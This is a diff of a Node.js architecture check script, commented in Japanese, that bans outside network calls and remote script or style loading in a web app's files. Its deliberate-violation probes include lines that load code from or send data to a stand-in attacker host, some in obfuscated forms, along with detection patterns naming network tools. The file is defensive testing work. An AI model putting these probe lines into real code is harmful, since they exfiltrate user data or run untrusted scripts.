@@ -1,15 +1,17 @@
 // 役割の決まり（spec/architecture.md の表 1）を検査する。
 // 1. 表のパスが全部あり、空でない。js/ の下のファイルは全部どこかの役割に入っている
 // 2. shared と core は、画面・保存・通信・時計・乱数を使わない
-// 3. 外へ通信する fetch は js/ai-reader.js だけ
+// 3. 外へ通信する fetch は js/ai-reader.js だけ。ほかの通信の道具と、外の URL を文字で書くことは全部の js で禁止
 // 4. shared は core と adapter を使わず、core は adapter を使わない（adapter の名前は adapter のファイルから拾う）
 // 5. AI の読み取りには見本（Fake）がある
 // 6. entry と adapter は HTML の文字列を直接入れない（innerHTML など）
 // 7. この検査自身が、わざと違反を入れた見本で落ちる（何も検査していないのに通る、を防ぐ）
-// 8. HTML から外を読むのは、表 3 に書いたサイトだけ。外のスクリプトには integrity を付ける
+// 8. HTML と CSS から外を読むのは、表「外から読む先」にそのファイルの先として書いた所だけ。外のスクリプトと読み込む link には integrity。
+//    js の import は importmap で URL に直して、1 つずつ integrity（中身は test/outside.mjs）
 // 決まりを外すときは、その行に「// arch-allow: 理由」を書く。外した数を毎回出す。
 // 実行: node test/arch.check.mjs
 import { readFileSync, existsSync, readdirSync } from 'node:fs';
+import { allowTable, fileProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';
 
 const root = new URL('../', import.meta.url);
 const read = (p) => readFileSync(new URL(p, root), 'utf8');
@@ -75,7 +77,18 @@ const rulesFor = {
 };
 const HTML_BAN = { line: [[/\.(innerHTML|outerHTML)\s*\+?=|insertAdjacentHTML|document\.write/, 'HTML の文字列を直接入れている'],
   [/\[\s*['"`](?:innerHTML|outerHTML|insertAdjacentHTML)['"`]\s*\]/, 'HTML の文字列を直接入れている', true]], file: [] };
-const FETCH_BAN = { line: [[/\bfetch\s*\(/, '外への通信 (ai-reader.js 以外)']], file: [] };
+/* 外への通信。fetch は ( が無くても（const f = fetch）見る。読み込むタグを作る・外の URL を書くのは、文字列の中身を残した方で見る */
+const NET_TOOLS = [
+  [/\bimport\s*\(/, '動的な import'],
+  [/\bsendBeacon\b|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b|\bnew\s+(?:Shared)?Worker\b|\bimportScripts\b/, '外への通信の道具'],
+  [/createElement(?:NS)?\s*\(\s*(?:[^,)]*,\s*)?['"`](?:script|link|iframe|frame|object|embed)['"`]/i, '読み込むタグを作っている', true],
+  [/\bel\s*\(\s*['"`](?:script|link|iframe|frame|object|embed)['"`]/i, '読み込むタグを作っている', true],
+  /* 文字列の頭の // と、ソースで \\\\ と書いた物（文字としては \\。ブラウザは // と同じに読む）。正規表現の '\\b' は外さない */
+  [/['"`]\s*(?:[a-z][a-z0-9+.-]*:)?(?:\/\/|\\{4})[^\s'"`]/i, '外の URL を文字で書いている', true],
+  [/\b(?:https?|wss?|ftp):[\\/]{2}/i, '外の URL を文字で書いている', true]
+];
+const NET_BAN = { line: [[/\bfetch\b/, '外への通信 fetch (ai-reader.js 以外)'], ...NET_TOOLS], file: [] };
+const AI_READER_BAN = { line: NET_TOOLS, file: [] };
 
 /* コメントを消す。文字列・テンプレート文字列（複数行も）・正規表現の中の // と /* は残す。\ の次の 1 字は読み飛ばす。
    blankStrings のときは文字列の中身も空白にする（見本メールの「Date of birth」を時計と見なさないため）。
@@ -146,43 +159,31 @@ function violations(src, rules) {
 ['shared', 'core'].forEach(role => (roles[role] || []).forEach(p => {
   violations(read(p), rulesFor[role]).forEach(v => fail(`${p}:${v.line} ${v.what} を使っている`));
 }));
-jsFiles.filter(f => f !== 'js/ai-reader.js').forEach(p => {
-  violations(read(p), FETCH_BAN).forEach(v => fail(`${p}:${v.line} ${v.what}`));
+jsFiles.forEach(p => {
+  violations(read(p), p === 'js/ai-reader.js' ? AI_READER_BAN : NET_BAN).forEach(v => fail(`${p}:${v.line} ${v.what}`));
 });
 [...(roles.entry || []), ...(roles.adapter || [])].filter(p => p.endsWith('.js')).forEach(p => {
   violations(read(p), HTML_BAN).forEach(v => fail(`${p}:${v.line} ${v.what}`));
 });
 if (!/function readSample\(/.test(read('js/ai-reader.js'))) fail('js/ai-reader.js に見本 (readSample) が無い');
 
-/* 8. HTML から外を読む先。表 3（## 3.）に書いたサイト名だけを許す。表と検査を 1 か所で合わせるため */
-const OUTSIDE = new Set(doc.slice(doc.indexOf('## 3.'), doc.indexOf('## 4.')).match(/[a-z0-9-]+(?:\.[a-z0-9-]+)+\.(?:com|net|org|io)/g) || []);
-if (!OUTSIDE.size) fail('表 3 に外から読むサイトが 1 つも無い（検査が何も見ていない）');
-function outsideProblems(html) {
-  const out = [];
-  const hostOf = (u) => { try { return new URL(u).host; } catch { return u; } };
-  for (const m of html.matchAll(/\b(?:src|href)\s*=\s*["'](https?:\/\/[^"']+)["']/g)) {
-    if (!OUTSIDE.has(hostOf(m[1]))) out.push(`外の読み込み先が表 3 に無い: ${hostOf(m[1])}`);
-  }
-  for (const m of html.matchAll(/<script\b[^>]*\bsrc\s*=\s*["']https?:[^>]*>/g)) {
-    if (!/\bintegrity\s*=\s*["']sha(?:256|384|512)-/.test(m[0])) out.push(`外のスクリプトに integrity が無い: ${m[0].slice(0, 90)}`);
-  }
-  for (const m of html.matchAll(/<script\b[^>]*type\s*=\s*["']importmap["'][^>]*>([\s\S]*?)<\/script>/g)) {
-    let map;
-    try { map = JSON.parse(m[1]); } catch { out.push('importmap が JSON として読めない'); continue; }
-    const integ = map.integrity || {};
-    Object.values(map.imports || {}).filter(u => /^https?:/.test(u)).forEach(u => {
-      if (!OUTSIDE.has(hostOf(u))) out.push(`importmap の読み込み先が表 3 に無い: ${hostOf(u)}`);
-      /* ファイルは自分の integrity、フォルダ（/ で終わる）はその下に 1 つ以上の integrity */
-      const ok = u.endsWith('/') ? Object.keys(integ).some(k => k.startsWith(u)) : Boolean(integ[u]);
-      if (!ok) out.push(`importmap の ${u} に integrity が無い`);
-    });
-    Object.keys(integ).filter(u => !OUTSIDE.has(hostOf(u))).forEach(u => out.push(`importmap の integrity の先が表 3 に無い: ${hostOf(u)}`));
-  }
-  return out;
-}
+/* 8. 外から読む先。許可は spec の表「外から読む先」だけから、ファイルごとに読む */
+const ALLOW = allowTable(doc);
+if (!ALLOW || !Object.keys(ALLOW).length) fail('spec/architecture.md に表「外から読む先」が無い（検査が何も見ていない）');
 const htmlFiles = readdirSync(new URL('./', root)).filter(f => f.endsWith('.html') && !f.endsWith('.local.html'));
+const cssFiles = readdirSync(new URL('css/', root)).filter(f => f.endsWith('.css')).map(f => `css/${f}`);
 if (!htmlFiles.length) fail('検査する HTML が無い');
-htmlFiles.forEach(f => outsideProblems(read(f)).forEach(v => fail(`${f}: ${v}`)));
+[...htmlFiles, ...cssFiles].forEach(f => {
+  const rule = ALLOW && ALLOW[f];
+  if (!rule) { fail(`表「外から読む先」に ${f} の行が無い`); return; }
+  const text = read(f);
+  fileProblems(text, rule, f.endsWith('.html')).forEach(v => fail(`${f}: ${v}`));
+  unusedAllows(text, rule).forEach(v => fail(`${f}: 表で許しているのに使っていない: ${v}`));
+});
+Object.keys(ALLOW || {}).filter(f => !existsSync(new URL(f, root))).forEach(f => fail(`表「外から読む先」のファイルが無い: ${f}`));
+const MAP = importmapOf(htmlFiles.map(read).join('\n'));
+const codeOf = (src) => stripComments(src, false).join('\n');
+jsFiles.forEach(p => importProblems(codeOf(read(p)), MAP).forEach(v => fail(`${p}: ${v}`)));
 
 /* 7. わざと違反を入れた見本。どれか 1 つでも見逃したら、この検査が甘い */
 const PROBES = [
@@ -211,23 +212,61 @@ PROBES.push([rulesFor.core, 'const s = `${Date.now()}`;'], [rulesFor.core, "cons
 const CLEAN = ['const s = "Date of birth";', "const u = 'window.document and fetch(x)';", 'const t = `Date: ${n}`;'];
 const before = allowed;
 PROBES.forEach(([rules, code]) => { if (!violations(code, rules).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
-const HTML_PROBES = [
-  '<script src="https://evil.example.com/x.js" integrity="sha512-x"></script>',
-  '<script src="https://cdnjs.cloudflare.com/x.js" crossorigin="anonymous"></script>',
-  '<link rel="stylesheet" href="https://evil.example.com/a.css">',
-  '<script type="importmap">{ "imports": { "a": "https://cdn.jsdelivr.net/npm/a@1/a.js" } }</script>',
-  '<script type="importmap">{ "imports": { "b/": "https://cdn.jsdelivr.net/npm/b@1/" } }</script>',
-  '<script type="importmap">{ "imports": { "a": "https://evil.example.com/a.js" }, "integrity": { "https://evil.example.com/a.js": "sha256-x" } }</script>'
+/* 8 番の見本（ジンとザクのレビューで見逃した書き方）。[許可の行, 中身, HTML か] */
+const NONE = { allow: [], bare: [] };
+const IDX = (ALLOW && ALLOW['index.html']) || NONE;
+const QR = 'https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/';
+const TJS = 'https://cdn.jsdelivr.net/npm/three@0.160.0/';
+const FILE_PROBES = [
+  [NONE, '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=BIZ+UDPGothic">', true],
+  [IDX, '<script src=https://evil.example.com/x.js></script>', true],
+  [IDX, '<SCRIPT SRC="HTTPS://evil.example.com/x.js"></SCRIPT>', true],
+  [IDX, '<script src="//evil.example.com/x.js"></script>', true],
+  [IDX, `<script src="${QR}x.js" data-integrity="sha512-x" crossorigin="anonymous"></script>`, true],
+  [IDX, `<script title="a>b integrity='sha512-x'" src="${QR}x.js"></script>`, true],
+  [IDX, `<link rel="modulepreload" href="${TJS}build/three.module.js">`, true],
+  [IDX, `<link rel="stylesheet" href="${TJS}x.css">`, true],
+  [IDX, `<base href="${TJS}">`, true],
+  [IDX, '<img srcset="https://evil.example.com/a.png 1x">', true],
+  [IDX, `<script type="module">import "${TJS}x.js";</script>`, true],
+  [IDX, '<script type=importmap>{ "imports": { "a": "https://evil.example.com/a.js" } }</script>', true],
+  [IDX, `<script type=" IMPORTMAP ">{ "imports": { "a": "${TJS}a.js" } }</script>`, true],
+  [IDX, `<script type="importmap">{ "imports": {}, "scopes": { "/js/": { "three": "${TJS}t.js" } } }</script>`, true],
+  [IDX, '<style>@import "https://evil.example.com/a.css";</style>', true],
+  [IDX, '<div style="background:url(//evil.example.com/p.png)"></div>', true],
+  [IDX, '<meta http-equiv="refresh" content="0;url=https://evil.example.com/">', true],
+  [IDX, '<script src="https&#58;//evil.example.com/x.js"></script>', true],
+  [IDX, '<script src="ht&#x9;tps://evil.example.com/x.js"></script>', true],
+  [IDX, '<script src="\\\\evil.example.com/x.js"></script>', true],
+  [IDX, `<script src="${TJS}../evil@1/x.js" integrity="sha512-x"></script>`, true],
+  [NONE, '@import url("https://fonts.googleapis.com/css2?family=X");', false],
+  [NONE, '.a{background:url(//evil.example.com/p.png)}', false]
 ];
-const HTML_CLEAN = '<script src="https://cdnjs.cloudflare.com/x.js" integrity="sha512-x" crossorigin="anonymous"></script><script src="js/app.js"></script>';
-HTML_PROBES.forEach(h => { if (!outsideProblems(h).length) fail(`検査が甘い: 「${h.slice(0, 70)}」を見逃した`); });
-if (outsideProblems(HTML_CLEAN).length) fail('検査が厳しすぎる: integrity 付きの外のスクリプトを違反と見た');
+const FILE_CLEAN = [
+  [IDX, `<script src="${QR}x.js" integrity="sha512-x" crossorigin="anonymous"></script><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=X">`, true],
+  [NONE, '<a href="index.html">x</a><script src="js/app.js"></script><svg xmlns="http://www.w3.org/2000/svg"></svg>', true],
+  [NONE, '.a{background:url(assets/x.png)}', false]
+];
+const NET_PROBES = ['import("https://evil.example.com/x.js");', "const x = '\\\\\\\\evil.example.com/a';", "el('script', { src: u });", "new Image().src = 'https://evil.example.com/p?d=' + d;",
+  'navigator.sendBeacon(u, d);', 'const f = fetch; f(u);', 'fetch\n(u);', "document.createElement('iframe');", 'const w = new Worker(u);',
+  'const s = new WebSocket(u);', "const x = '//evil.example.com/a';", 'const x = "wss://evil.example.com/a";', 'importScripts(u);'];
+const NET_CLEAN = ["const s = 'a//b'; const u = '/api/read'; const p = x.split('//');", "const re = new RegExp('\\\\b(?:cold)\\\\b'); const e = s.replace(r, '\\\\$&');", "el('button', { type: 'button' });", 'const prefetch = 1;'];
+const IMPORT_PROBES = ["import { OrbitControls } from 'three/addons/controls/OrbitControls.js';", "import x from 'lodash';",
+  "export * from 'https://evil.example.com/x.js';"];
+const IMPORT_CLEAN = "import * as THREE from 'three';\nimport { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';\nimport { a } from './a.js';";
+const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length;
+FILE_PROBES.forEach(([rule, text, isHtml]) => { if (!fileProblems(text, rule, isHtml).length) fail(`検査が甘い: 「${text.slice(0, 70)}」を見逃した`); });
+FILE_CLEAN.forEach(([rule, text, isHtml]) => { const v = fileProblems(text, rule, isHtml); if (v.length) fail(`検査が厳しすぎる: 「${text.slice(0, 50)}」→ ${v[0]}`); });
+NET_PROBES.forEach(code => { if (!violations(code, NET_BAN).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
+NET_CLEAN.forEach(code => { if (violations(code, NET_BAN).length) fail(`検査が厳しすぎる: 「${code}」を違反と見た`); });
+IMPORT_PROBES.forEach(code => { if (!importProblems(code, MAP).length) fail(`検査が甘い: 「${code}」を見逃した`); });
+if (importProblems(IMPORT_CLEAN, MAP).length) fail(`検査が厳しすぎる: ${importProblems(IMPORT_CLEAN, MAP)[0]}`);
 CLEAN.forEach(code => { if (violations(code, rulesFor.core).length) fail(`検査が厳しすぎる: 「${code}」を違反と見た`); });
 allowed = before;
 
 console.log(`files: shared ${roles.shared?.length || 0} / core ${roles.core?.length || 0} / adapter ${roles.adapter?.length || 0} / entry ${roles.entry?.length || 0}`);
-console.log(`names: adapter ${ADAPTER.length} / core ${CORE.length} / probes: ${PROBES.length} + html ${HTML_PROBES.length} / arch-allow: ${allowed}`);
-console.log(`outside: ${[...OUTSIDE].join(' ')} / html: ${htmlFiles.join(' ')}`);
+console.log(`names: adapter ${ADAPTER.length} / core ${CORE.length} / probes: ${PROBES.length} + outside ${probeCount} / arch-allow: ${allowed}`);
+console.log(`outside: ${Object.entries(ALLOW || {}).map(([f, r]) => `${f} ${r.allow.length}`).join(' / ')}`);
 if (problems.length) {
   problems.forEach(p => console.log(`FAIL ${p}`));
   process.exit(1);
